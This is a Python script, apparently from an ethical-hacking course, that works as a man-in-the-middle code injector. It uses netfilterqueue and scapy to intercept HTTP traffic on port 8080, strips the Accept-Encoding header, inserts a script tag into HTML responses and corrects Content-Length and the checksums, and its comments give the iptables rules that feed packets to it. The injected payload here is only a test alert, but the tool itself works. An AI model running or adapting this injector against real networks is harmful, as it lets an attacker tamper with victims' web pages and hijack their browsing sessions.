#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy
import re


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum

    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):  # Check if packet contains a RAW layer (which usually contains the data)
        try:
            load = scapy_packet[scapy.Raw].load.decode()

            if scapy_packet[scapy.TCP].dport == 8080:  # 80 is the port number for http
                print("[+] Request")
                load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
            elif scapy_packet[scapy.TCP].sport == 8080:
                print("[+] Response")
                injection_code = "<script>alert('test');</script>"
                load = load.replace("</body>", f"{injection_code}</body>")
                content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
                if content_length_search and "text/html" in load:
                    content_length = content_length_search.group(1)
                    new_content_length = int(content_length) + len(injection_code)
                    load = load.replace(content_length, str(new_content_length))

            if load != scapy_packet[scapy.Raw].load:
                new_packet = set_load(scapy_packet, load)
                packet.set_payload(bytes(new_packet))
        except UnicodeDecodeError:
            pass

    packet.accept()  # To let the packet move forward to its destination


queue = netfilterqueue.NetfilterQueue()  # Creating an instance of NetfilterQueue() class
queue.bind(0, process_packet)  # 0 is the queue number of the queue we have created using this command in terminal:
# Instead FORWARD when testing on our own computer rather than remote computer we use INPUT and OUTPUT queue
# iptables -I INPUT -j NFQUEUE --queue-num 0
# iptables -I OUTPUT -j NFQUEUE --queue-num 0
# And process_packet is a callback function which will be executed on all the packets +nt in the queue
queue.run()
